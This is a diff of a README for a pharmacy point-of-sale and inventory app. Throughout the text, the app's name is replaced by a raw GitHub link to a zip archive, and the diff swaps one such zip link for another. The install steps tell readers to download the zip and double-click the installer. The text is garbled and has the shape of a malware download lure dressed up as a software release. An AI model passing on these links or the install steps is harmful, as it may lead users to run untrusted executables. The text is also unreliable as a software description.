@@ -1,10 +1,10 @@
-# 🏥 https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip - Easy POS and Inventory Management
+# 🏥 https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip - Easy POS and Inventory Management
 
-![Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip%20Latest%20Release-latest-brightgreen)
+![Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip%20Latest%20Release-latest-brightgreen)
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip! This application helps you manage your point of sale (POS) and inventory easily. Whether you run a small pharmacy or a larger establishment, this software is designed to simplify your operations.
+Welcome to https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip! This application helps you manage your point of sale (POS) and inventory easily. Whether you run a small pharmacy or a larger establishment, this software is designed to simplify your operations.
 
 ## 📦 Features
 
@@ -23,9 +23,9 @@ Welcome to https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/m
 
 ## 🔗 Download & Install
 
-To get started with https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip, visit the following page to download the latest version:
+To get started with https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip, visit the following page to download the latest version:
 
-[Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip)
+[Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip)
 
 Follow these steps to install the software:
 
@@ -37,7 +37,7 @@ Follow these steps to install the software:
 6. Double-click the file to run the installer.
 7. Follow the on-screen prompts to complete the installation.
 
-## 🎓 How to Use https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip
+## 🎓 How to Use https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip
 
 After installation, open the application. You will see a dashboard with various options:
 
@@ -62,10 +62,10 @@ Your feedback is valuable! Feel free to raise issues or ask questions in the Git
 
 ## ❤️ Acknowledgments
 
-Thank you for choosing https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip We hope this application serves your needs effectively. Your support motivates us to enhance the software continuously. 
+Thank you for choosing https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip We hope this application serves your needs effectively. Your support motivates us to enhance the software continuously. 
 
 ## 📞 Contact
 
 For further inquiries or feedback, please reach out through the GitHub Issues section.
 
-Visit this page for all downloads and updates: [Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St.MargarethPharmacy-v2.9-alpha.5.zip)
+Visit this page for all downloads and updates: [Download Latest Release](https://raw.githubusercontent.com/DhruvTilavat/St.MargarethPharmacy/main/pages/St_Pharmacy_Margareth_2.4.zip)
